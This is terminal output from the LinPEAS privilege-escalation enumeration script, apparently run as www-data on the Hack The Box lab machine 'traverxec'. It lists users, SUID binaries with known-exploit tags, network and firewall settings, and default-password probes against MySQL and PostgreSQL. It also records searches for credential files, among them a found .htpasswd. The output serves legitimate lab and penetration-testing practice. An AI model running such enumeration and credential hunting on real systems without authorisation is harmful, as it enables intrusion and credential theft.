[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
[0mNEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Sun 2021-04-11 20:58:16 EDT  2h 43min left Sun 2021-04-11 17:53:16 EDT  21min ago [1;32mapt-daily.timer[0m              apt-daily.service
Mon 2021-04-12 00:00:00 EDT  5h 45min left Sun 2021-04-11 17:53:16 EDT  21min ago [1;32mlogrotate.timer[0m              logrotate.service
Mon 2021-04-12 00:00:00 EDT  5h 45min left Sun 2021-04-11 17:53:16 EDT  21min ago [1;32mman-db.timer[0m                 man-db.service
Mon 2021-04-12 06:12:02 EDT  11h left      Sun 2021-04-11 17:53:16 EDT  21min ago [1;32mapt-daily-upgrade.timer[0m      apt-daily-upgrade.service
Mon 2021-04-12 18:08:17 EDT  23h left      Sun 2021-04-11 18:08:17 EDT  6min ago  [1;32msystemd-tmpfiles-clean.timer[0m systemd-tmpfiles-clean.service

[1;33m[+] [1;32mAnalyzing .timer files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
[0m
[1;33m[+] [1;32mAnalyzing .socket files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
[0m
[1;33m[+] [1;32mHTTP sockets
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
[0m
[1;33m[+] [1;32mD-Bus config files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
[0m
[1;33m[+] [1;32mD-Bus Service Objects list
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
[0m[1;32mNAME[0m                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
[1;32m:1.0[0m                             408 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
[1;32m:1.1[0m                               1 systemd         root             :1.1          init.scope                -          -
[1;32m:1.3[0m                             414 systemd-logind  root             :1.3          systemd-logind.service    -          -
[1;32m:1.58[0m                           8199 busctl          www-data         :1.58         nostromo.service          -          -
[1;32morg.freedesktop.DBus[0m               1 systemd         root             -             init.scope                -          -
[1;32morg.freedesktop.hostname1[0m          - -               -                (activatable) -                         -
[1;32morg.freedesktop.locale1[0m            - -               -                (activatable) -                         -
[1;32morg.freedesktop.login1[0m           414 systemd-logind  root             :1.3          systemd-logind.service    -          -
[1;32morg.freedesktop.network1[0m           - -               -                (activatable) -                         -
[1;32morg.freedesktop.resolve1[0m           - -               -                (activatable) -                         -
[1;32morg.freedesktop.systemd1[0m           1 systemd         root             :1.1          init.scope                -          -
[1;32morg.freedesktop.timedate1[0m          - -               -                (activatable) -                         -
[1;32morg.freedesktop.timesync1[0m        408 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -


[1;34m═══════════════════════════════════╣ [1;32mNetwork Information[1;34m ╠════════════════════════════════════
[0m[1;33m[+] [1;32mHostname, hosts and DNS
[0mtraverxec
127.0.0.1	localhost
127.0.1.1	traverxec.htb	traverxec

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 10.211.55.1
htb

[1;33m[+] [1;32mContent of /etc/inetd.conf & /etc/xinetd.conf
[0m[1;90m/etc/inetd.conf Not Found
[0m
[1;33m[+] [1;32mInterfaces
[0mdefault		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b9:64:e9 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever

[1;33m[+] [1;32mNetworks and neighbours
[0m10.10.10.2 dev eth0 lladdr 00:50:56:b9:34:07 REACHABLE
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:34:07     *        eth0

[1;33m[+] [1;32mIptables rules
[0m*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -i eth0 -p tcp -m tcp --dport 22 -m tcp -m state --state NEW -m recent --set --name SSH --mask 255.255.255.255 --rsource 
-A INPUT -i eth0 -p tcp -m tcp --dport 22 -m tcp -m state --state NEW -m recent --update --seconds 1 --hitcount 10 --name SSH --mask 255.255.255.255 --rsource -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i eth0 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i eth0 -p tcp -m tcp --dport 80 -m tcp -m state --state NEW -m recent --set --name HTTP --mask 255.255.255.255 --rsource 
-A INPUT -i eth0 -p tcp -m tcp --dport 80 -m tcp -m state --state NEW -m recent --update --seconds 1 --hitcount 40 --name HTTP --mask 255.255.255.255 --rsource -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i eth0 -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p icmp -j ACCEPT
COMMIT

[1;33m[+] [1;32mActive Ports
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
[0m
[1;33m[+] [1;32mCan I sniff with tcpdump?
[0m[1;90mNo
[0m

[1;34m════════════════════════════════════╣ [1;32mUsers Information[1;34m ╠════════════════════════════════════
[0m[1;33m[+] [1;32mMy user
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#users
[0muid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) gid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) groups=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m)

[1;33m[+] [1;32mDo I have PGP keys?
[0m[1;90mgpg Not Found
[0m[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
[1;33m[+] [1;32mClipboard or highlighted text?
[0m[1;90mxsel and xclip Not Found
[0m
[1;33m[+] [1;32mChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m
[1;33m[+] [1;32mChecking sudo tokens
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m/proc/sys/kernel/yama/ptrace_scope is enabled ([1;31m0[0m)
[1;32mgdb[0m wasn't found in PATH

[1;33m[+] [1;32mChecking doas.conf
[0m[1;90m/etc/doas.conf Not Found
[0m
[1;33m[+] [1;32mChecking Pkexec policy
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
[0m
[1;33m[+] [1;32mSuperusers
[0m[1;31mroot[0m:x:0:0:root:/root:/bin/bash

[1;33m[+] [1;32mUsers with console
[0m[1;96mdavid[0m:x:1000:1000:david,,,:/home/david:/bin/bash
[1;31mroot[0m:x:0:0:root:/root:/bin/bash

[1;33m[+] [1;32mAll users & groups
[0muid=0[1;31m([1;31mroot[0m)[0m gid=0[1;31m(root)[0m groups=0[1;31m(root)[0m
uid=1([1;34m[1;32mdaemon[0m[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=10([1;34muucp[0m) gid=10([1;34muucp[0m) groups=10([1;34muucp[0m)
uid=100([1;34m_apt[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=1000([1;96mdavid[0m) gid=1000([1;96mdavid[0m) groups=1000([1;96mdavid[0m),24[1;32m(cdrom)[0m,25(floppy),29(audio),30(dip),44[1;31m(video)[0m,46[1;32m(plugdev)[0m,109(netdev)
uid=101([1;34msystemd-timesync[0m) gid=102([1;34msystemd-timesync[0m) groups=102([1;34msystemd-timesync[0m)
uid=102([1;34msystemd-network[0m) gid=103([1;34msystemd-network[0m) groups=103([1;34msystemd-network[0m)
uid=103([1;34msystemd-resolve[0m) gid=104([1;34msystemd-resolve[0m) groups=104([1;34msystemd-resolve[0m)
uid=104([1;34mmessagebus[0m) gid=110([1;34mmessagebus[0m) groups=110([1;34mmessagebus[0m)
uid=105([1;34msshd[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=13([1;34mproxy[0m) gid=13([1;34mproxy[0m) groups=13([1;34mproxy[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3([1;34msys[0m) gid=3([1;34msys[0m) groups=3([1;34msys[0m)
uid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) gid=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m) groups=33([1;95m[1;34m[1;32mwww-data[0m[0m[0m)
uid=34([1;34mbackup[0m) gid=34([1;34mbackup[0m) groups=34([1;34mbackup[0m)
uid=38([1;34mlist[0m) gid=38([1;34mlist[0m) groups=38([1;34mlist[0m)
uid=39([1;34mirc[0m) gid=39([1;34mirc[0m) groups=39([1;34mirc[0m)
uid=4([1;34msync[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=41([1;34mgnats[0m) gid=41([1;34mgnats[0m) groups=41([1;34mgnats[0m)
uid=5([1;34mgames[0m) gid=60([1;34mgames[0m) groups=60([1;34mgames[0m)
uid=6([1;34mman[0m) gid=12([1;34mman[0m) groups=12([1;34mman[0m)
uid=65534([1;34mnobody[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=7([1;34mlp[0m) gid=7([1;34mlp[0m) groups=7([1;34mlp[0m)
uid=8([1;34m[1;32mmail[0m[0m) gid=8([1;34m[1;32mmail[0m[0m) groups=8([1;34m[1;32mmail[0m[0m)
uid=9([1;34mnews[0m) gid=9([1;34mnews[0m) groups=9([1;34mnews[0m)
uid=999([1;34msystemd-coredump[0m) gid=999([1;34msystemd-coredump[0m) groups=999([1;34msystemd-coredump[0m)

[1;33m[+] [1;32mLogin now
[0m 18:14:22 up 21 min,  0 users,  load average: 0.11, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;33m[+] [1;32mLast logons
[0mreboot   [1;31msys[0mtem boot  Tue Nov 12 04:04:28 2019 - Tue Nov 12 04:06:23 2019  (00:01)     0.0.0.0
[1;31mroot[0m     tty1         Tue Nov 12 04:02:12 2019 - down                      (00:02)     0.0.0.0
reboot   [1;31msys[0mtem boot  Tue Nov 12 04:01:38 2019 - Tue Nov 12 04:04:21 2019  (00:02)     0.0.0.0
[1;31mroot[0m     tty1         Tue Nov 12 03:59:51 2019 - down                      (00:01)     0.0.0.0
reboot   [1;31msys[0mtem boot  Tue Nov 12 03:59:29 2019 - Tue Nov 12 04:01:28 2019  (00:01)     0.0.0.0
[1;31mroot[0m     tty1         Tue Nov 12 03:56:15 2019 - down                      (00:03)     0.0.0.0
[1;31mroot[0m     tty1         Tue Nov 12 03:51:49 2019 - Tue Nov 12 03:56:03 2019  (00:04)     0.0.0.0
reboot   [1;31msys[0mtem boot  Tue Nov 12 03:50:46 2019 - Tue Nov 12 03:59:19 2019  (00:08)     0.0.0.0

wtmp begins Sun Oct 27 16:25:39 2019

[1;33m[+] [1;32mLast time logon each user
[0mUsername         Port     From             Latest
[1;31mroot[0m             tty1                      Sat Nov 16 16:07:31 -0500 2019

[1;33m[+] [1;32mPassword policy
[0mPASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512

[1;33m[+] [1;32mDo not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[0m[1;33m[+] [1;32mDo not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
[0m

[1;34m═══════════════════════════════════╣ [1;32mSoftware Information[1;34m ╠═══════════════════════════════════
[0m[1;33m[+] [1;32mMySQL version
[0m[1;90mmysql Not Found
[0m
[1;33m[+] [1;32mMySQL connection using default root/root ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mMySQL connection using root/toor ................... [0m[1;90mNo
[0m[1;33m[+] [1;32mMySQL connection using root/NOPASS ................. [0m[1;90mNo
[0m[1;33m[+] [1;32mSearching mysql credentials and exec
[0m
[1;33m[+] [1;32mPostgreSQL version and pgadmin credentials
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mPostgreSQL connection to template0 using postgres/NOPASS ........ [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template1 using postgres/NOPASS ........ [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template0 using pgsql/NOPASS ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mPostgreSQL connection to template1 using pgsql/NOPASS ........... [0m[1;90mNo
[0m
[1;33m[+] [1;32mApache server info
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching PHPCookies
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Wordpress wp-config.php files
[0m[1;90mwp-config.php Not Found
[0m
[1;33m[+] [1;32mSearching Drupal settings.php files
[0m[1;90m/default/settings.php Not Found
[0m
[1;33m[+] [1;32mSearching Moodle config.php files
[0m[1;90mconfig.php inside a moodle folder Not Found
[0m
[1;33m[+] [1;32mSearching Tomcat users file
[0m[1;90mtomcat-users.xml Not Found
[0m
[1;33m[+] [1;32mMongo information
[0m[1;90mmongo binary Not Found
[0m
[1;33m[+] [1;32mSearching supervisord configuration file
[0m[1;90msupervisord.conf Not Found
[0m
[1;33m[+] [1;32mSearching cesi configuration file
[0m[1;90mcesi.conf Not Found
[0m
[1;33m[+] [1;32mSearching Rsyncd config file
[0m[1;90mrsyncd.conf Not Found
[0m[1;33m[+] [1;32mSearching Hostapd config file
[0m[1;90mhostapd.conf Not Found
[0m
[1;33m[+] [1;32mSearching wifi conns file
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Anaconda-ks config files
[0m[1;90manaconda-ks.cfg Not Found
[0m
[1;33m[+] [1;32mSearching .vnc directories and their passwd files
[0m[1;90m.vnc Not Found
[0m
[1;33m[+] [1;32mSearching ldap directories and their hashes
[0m/etc/ldap
The password hash is from the {SSHA} to 'structural'

[1;33m[+] [1;32mSearching .ovpn files and credentials
[0m[1;90m.ovpn Not Found
[0m
[1;33m[+] [1;32mSearching ssl/ssh files
[0mChallengeResponseAuthentication no
UsePAM yes
  --> Some certificates were found (out limited):
/etc/vmware-tools/GuestProxyData/server/cert.pem

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
[1;31mHost[0m *
    SendEnv LANG LC_*
    HashKnown[1;31mHost[0ms yes
    GSSAPIAuthentication yes

[1;33m[+] [1;32mSearching unexpected auth lines in /etc/pam.d/sshd
[0m[1;90mNo
[0m
[1;33m[+] [1;32mSearching Cloud credentials (AWS, Azure, GC)
[0m
[1;33m[+] [1;32mNFS exports?
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
[0m[1;90m/etc/exports Not Found
[0m
[1;33m[+] [1;32mSearching kerberos conf files and tickets
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
[0m[1;90mtickets kerberos Not Found
[0m[1;90mklist Not Found
[0m
[1;33m[+] [1;32mSearching Kibana yaml
[0m[1;90mkibana.yml Not Found
[0m
[1;33m[+] [1;32mSearching Knock configuration
[0m[1;90mKnock.config Not Found
[0m
[1;33m[+] [1;32mSearching logstash files
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching elasticsearch files
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mSearching Vault-ssh files
[0m[1;90mvault-ssh-helper.hcl Not Found
[0m
[1;33m[+] [1;32mSearching AD cached hashes
[0m[1;90mcached hashes Not Found
[0m
[1;33m[+] [1;32mSearching screen sessions
[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
[0m[1;90mscreen Not Found
[0m
[1;33m[+] [1;32mSearching tmux sessions
[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
[0m[1;90mtmux Not Found
[0m
[1;33m[+] [1;32mSearching Couchdb directory
[0m
[1;33m[+] [1;32mSearching redis.conf
[0m
[1;33m[+] [1;32mSearching dovecot files
[0m[1;90mdovecot credentials Not Found
[0m
[1;33m[+] [1;32mSearching mosquitto.conf
[0m
[1;33m[+] [1;32mSearching neo4j auth file
[0m
[1;33m[+] [1;32mSearching Cloud-Init conf file
[0m
[1;33m[+] [1;32mSearching Erlang cookie file
[0m
[1;33m[+] [1;32mSearching GVM auth file
[0m
[1;33m[+] [1;32mSearching IPSEC files
[0m
[1;33m[+] [1;32mSearching IRSSI files
[0m
[1;33m[+] [1;32mSearching Keyring files
[0mKeyring folder: [1;31m/usr/share/keyrings[0m
/usr/share/[1;31mkeyrings[0m:
total 132
-rw-r--r-- 1 root root  8132 Apr 23  2019 debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root  8141 Apr 23  2019 debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root  2332 Apr 23  2019 debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root  5106 Apr 23  2019 debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root  5115 Apr 23  2019 debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root  2763 Apr 23  2019 debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 48747 Apr 23  2019 debian-archive-keyring.gpg
-rw-r--r-- 1 root root 23889 Apr 23  2019 debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root  7443 Apr 23  2019 debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root  7452 Apr 23  2019 debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root  2263 Apr 23  2019 debian-archive-stretch-stable.gpg

[1;33m[+] [1;32mSearching Filezilla sites file
[0m
[1;33m[+] [1;32mSearching backup-manager files
[0m
[1;33m[+] [1;32mSearching uncommon passwd files (splunk)
[0mpasswd file: [1;31m/etc/pam.d/passwd[0m
passwd file: [1;31m/usr/share/bash-completion/completions/passwd[0m
passwd file: [1;31m/usr/share/lintian/overrides/passwd[0m
passwd file: [1;31m/var/nostromo/conf/.htpasswd[0m

[1;33m[+] [1;32mSearching GitLab related files
[0m

[1;33m[+] [1;32mSearching PGP/GPG
[0mPGP/GPG software:
[1;90mgpg Not Found
[0m[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
[1;33m[+] [1;32mSearching vim files
[0m
[1;33m[+] [1;32mChecking if containerd(ctr) is available
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
[0m
[1;33m[+] [1;32mChecking if runc is available
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
[0m
[1;33m[+] [1;32mSearching docker files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
[0m
[1;33m[+] [1;32mInteresting Firefox Files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
[0m
[1;33m[+] [1;32mInteresting Chrome Files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
[0m
[1;33m[+] [1;32mAutologin Files
[0m


[1;33m[+] [1;32mS/Key authentication
[0m
[1;33m[+] [1;32mYubiKey authentication
[0m
[1;33m[+] [1;32mPasswords inside pam.d
[0m

[1;34m════════════════════════════════════╣ [1;32mInteresting Files[1;34m ╠════════════════════════════════════
[0m[1;33m[+] [1;32mSUID - Check easy privesc, exploits and write perms
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m[1;90mstrings Not Found
[0m[1;90mstrace Not Found
[0m-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject[1;32m/dmcrypt-get-device[0m
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin[1;31m/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)[0m
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin[1;31m/newgrp  --->  HP-UX_10.20[0m
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin[1;32m/gpasswd[0m
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin[1;32m/chsh[0m
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin[1;31m/chfn  --->  SuSE_9.3/10[0m
-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin[1;31m/umount  --->  BSD/Linux(08-1996)[0m
-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin[1;32m/su[0m
-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin[1;31m/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8[0m
-rwsr-xr-- 1 root messagebus  50K Jun  9  2019 /usr/lib/dbus-1.0[1;32m/dbus-daemon-launch-helper[0m
-rwsr-xr-x 1 root root       427K Oct  6  2019 /usr/lib/openssh[1;32m/ssh-keysign[0m
-rwsr-xr-x 1 root root       154K Oct 12  2019 [1m/usr/bin/sudo[0m
[3m-r-sr-xr-x 1 root root        14K Nov 12  2019 /usr/lib/vmware-tools/bin32[1;32m/vmware-user-suid-wrapper[0m
-r-sr-xr-x 1 root root        14K Nov 12  2019 /usr/lib/vmware-tools/bin64[1;32m/vmware-user-suid-wrapper[0m

[1;33m[+] [1;32mSGID
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
[0m-rwxr-sr-x 1 root mail     19K Dec  3  2017 /usr/bin[1;32m/dotlockfile[0m
-rwxr-sr-x 1 root tty      15K May  4  2018 /usr/bin[1;32m/bsd-write[0m
-rwxr-sr-x 1 root shadow   31K Jul 27  2018 /usr/bin[1;32m/expiry[0m
-rwxr-sr-x 1 root shadow   71K Jul 27  2018 /usr/bin[1;32m/chage[0m
-rwxr-sr-x 1 root tty      35K Jan 10  2019 /usr/bin[1;32m/wall[0m
-rwxr-sr-x 1 root shadow   39K Feb 14  2019 /usr/sbin[1;32m/unix_chkpwd[0m
-rwxr-sr-x 1 root crontab  43K Jun 23  2019 /usr/bin[1;32m/crontab[0m
-rwxr-sr-x 1 root ssh     315K Oct  6  2019 /usr/bin[1;32m/ssh-agent[0m

[1;33m[+] [1;32mChecking misconfigurations of ld.so
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
[0m[3m/etc/ld.so.conf
[0minclude /etc/ld.so.conf.d/*.conf

[3m/etc/ld.so.conf.d
[0m[3m  /etc/ld.so.conf.d/libc.conf
[0m[1;32m/usr/local/lib[0m
[3m  /etc/ld.so.conf.d/vmware-tools-libraries.conf
[0m/usr/lib/vmware-tools[1;32m/lib32[0m/libvmGuestLib.so
/usr/lib/vmware-tools/lib64/libvmGuestLib.so
/usr/lib/vmware-tools[1;32m/lib32[0m/libvmGuestLibJava.so
/usr/lib/vmware-tools/lib64/libvmGuestLibJava.so
/usr/lib/vmware-tools[1;32m/lib32[0m/libDeployPkg.so
/usr/lib/vmware-tools/lib64/libDeployPkg.so
[3m  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
[0m[1;32m/usr/local/lib/x86_64-linux-gnu[0m
[1;32m/lib/x86_64-linux-gnu[0m
[1;32m/usr/lib/x86_64-linux-gnu[0m

[1;33m[+] [1;32mCapabilities
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
[0mCurrent capabilities:
Current: =
[1;32mCapInh:	0000000000000000[0m
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
[1;32mCapBnd:	0000003fffffffff[0m
[1;32mCapAmb:	0000000000000000[0m

Shell capabilities:
0x0000000000000000=
[1;32mCapInh:	0000000000000000[0m
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
[1;32mCapBnd:	0000003fffffffff[0m
[1;32mCapAmb:	0000000000000000[0m

Files with capabilities:
/usr/bin/ping = cap_net_raw+ep

[1;33m[+] [1;32mUsers with capabilities
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
[0m[1;90m/etc/security/capability.conf Not Found
[0m
[1;33m[+] [1;32mFiles with ACLs
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
[0m[1;90mfiles with acls in searched folders Not Found
[0m
[1;33m[+] [1;32m.sh files in path
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
[0m/usr/bin[1;32m/gettext.sh[0m

[1;33m[+] [1;32mUnexpected in root
[0m[1;31m/initrd.img[0m
[1;31m/libx32[0m
[1;31m/lost+found[0m
[1;31m/vmlinuz.old[0m
[1;31m/lib32[0m
[1;31m/initrd.img.old[0m
[1;31m/vmlinuz[0m

[1;33m[+] [1;32mFiles (scripts) in /etc/profile.d/
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
[0mtotal 12
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  664 Mar  1  2019 [1;32mbash_completion.sh[0m

[1;33m[+] [1;32mPermissions in init, init.d, systemd, and rc.d
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
[0m
[1;33m[+] [1;32mHashes inside passwd file? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mWritable passwd file? ................ [0m[1;90mNo
[0m[1;33m[+] [1;32mCredentials in fstab/mtab? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read shadow files? ............. [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read opasswd file? ............. [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I write in network-scripts? ...... [0m[1;90mNo
[0m[1;33m[+] [1;32mCan I read root folder? .............. [0m[1;90mNo
[0m
[1;33m[+] [1;32mSearching root files in home dirs (limit 30)
[0m/home/
/root/

[1;33m[+] [1;32mSearching folders owned by me containing others files on it
[0m
[1;33m[+] [1;32mReadable files belonging to root and readable by me but not world readable
[0m
[1;33m[+] [1;32mModified interesting files in the last 5mins (limit 100)
[0m/var/log/btmp

[1;33m[+] [1;32mWritable log files (logrotten) (limit 100)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
[0mlogrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

[1;33m[+] [1;32mFiles inside /home/www-data (limit 20)
[0m
[1;33m[+] [1;32mFiles inside others home (limit 20)
[0m
[1;33m[+] [1;32mSearching installed mail applications
[0m
[1;33m[+] [1;32mMails (limit 50)
[0m
[1;33m[+] [1;32mBackup folders
[0mdrwxr-xr-x 2 root root 4096 Nov 12  2019 /var/backups
total 380
-rw-r--r-- 1 root root    40960 Nov 12  2019 alternatives.tar.0
-rw-r--r-- 1 root root     7665 Oct 25  2019 apt.extended_states.0
-rw-r--r-- 1 root root      186 Oct 25  2019 dpkg.diversions.0
-rw-r--r-- 1 root root      100 Oct 25  2019 dpkg.statoverride.0
-rw-r--r-- 1 root root   314222 Oct 25  2019 dpkg.status.0
-rw------- 1 root root      708 Oct 25  2019 group.bak
-rw------- 1 root shadow    597 Oct 25  2019 gshadow.bak
-rw------- 1 root root     1395 Oct 25  2019 passwd.bak
-rw------- 1 root shadow    940 Oct 27  2019 shadow.bak


[1;33m[+] [1;32mBackup files
[0m-rwxr-xr-x 1 root root 34132 Nov 12  2019 /usr/lib/vmware-tools/plugins32/vmsvc/libvm[1;31mbackup[0m.so
-rwxr-xr-x 1 root root 38984 Nov 12  2019 /usr/lib/vmware-tools/plugins64/vmsvc/libvm[1;31mbackup[0m.so
-rw-r--r-- 1 root root 9716 Sep 20  2019 /usr/lib/modules/4.19.0-6-amd64/kernel/drivers/net/team/team_mode_active[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 9716 Aug  7  2019 /usr/lib/modules/4.19.0-5-amd64/kernel/drivers/net/team/team_mode_active[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes[1;31m.old[0m.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README[1;31m.old[0m.gz
-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog[1;31m.old[0m.gz

[1;33m[+] [1;32mSearching tables inside readable .db/.sql/.sqlite files (limit 100)
[0m
